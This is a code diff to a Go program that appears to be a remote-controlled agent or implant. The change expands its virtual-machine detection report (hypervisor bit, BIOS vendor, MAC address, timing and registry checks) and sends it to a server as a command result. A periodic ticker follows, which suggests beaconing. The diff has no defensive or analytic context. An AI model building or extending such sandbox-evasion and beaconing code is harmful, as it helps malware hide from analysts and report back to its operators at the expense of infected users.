@@ -50,11 +50,29 @@ func main() {
         vmRes := DetectVM()
 
 
-        // Send VM result to server (adjust as needed)
+// Build detailed VM detection result
+        vmResult := fmt.Sprintf(
+                "VM Detection Results:\n"+
+                "- Hypervisor Bit Set: %v\n"+
+                "- BIOS Vendor Indicates VM: %v\n"+
+                "- MAC Address Indicates VM: %v\n"+
+                "- Timing Anomaly Detected: %v\n"+
+                "- Registry Artifacts Found: %v\n"+
+                "--------------------------------\n"+
+                "Likely Running in VM: %v\n",
+                vmRes.HypervisorBit,
+                vmRes.BIOSVendorMatch,
+                vmRes.MACOUI,
+                vmRes.TimingAnomaly,
+                vmRes.RegistryArtifacts,
+                vmRes.LikelyVM,
+        )
+
         sendResult(CommandResult{
-                ID: "vm_check",
-                Result: fmt.Sprintf("VM Detected: %v", vmRes.LikelyVM),
+                ID:     "vm_check",
+                Result: vmResult,
         })
+
 
     ticker := time.NewTicker(10 * time.Second)
 
@@ -590,4 +608,3 @@ func checkTimingAnomaly() bool {
         duration := time.Since(start)
         return duration > 80*time.Millisecond
 }
-
